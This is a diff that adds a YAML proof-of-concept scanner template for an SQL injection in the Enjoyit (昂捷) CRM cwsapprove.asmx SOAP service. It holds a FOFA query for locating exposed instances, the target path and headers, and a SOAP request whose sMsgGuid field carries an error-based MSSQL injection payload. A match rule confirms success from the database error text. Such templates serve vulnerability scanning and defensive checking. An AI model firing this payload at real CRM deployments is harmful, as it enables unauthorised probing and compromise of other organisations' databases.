@@ -1,0 +1,26 @@
+id: poc-yaml-enjoyit-crm-cwsapprove-asmx-sqli
+info:
+  name: 昂捷CRM cwsapprove.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 昂捷CRM
+  fofa: body="/Scripts/EnjoyMsg.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /EnjoyRMIS_WS/WS/Approve/cwsapprove.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    Soapaction: '"http://tempuri.org/EndBillApprove1"'
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <EndBillApprove1 xmlns=\"http://tempuri.org/\">\n      <sMsgGuid>'\
+    \ AND 9173 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')))) AND\
+    \ 'rhYc'='rhYc</sMsgGuid>\n      <sUserno>string</sUserno>\n      <sEformDataIp>string</sEformDataIp>\n\
+    \    </EndBillApprove1>\n  </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 500 && contains(body,t2) && contains(body,"服务器无法处理请求")
+    && contains(body,"转换成数据类型") && contains(content_type,"text/xml")
+transport: http
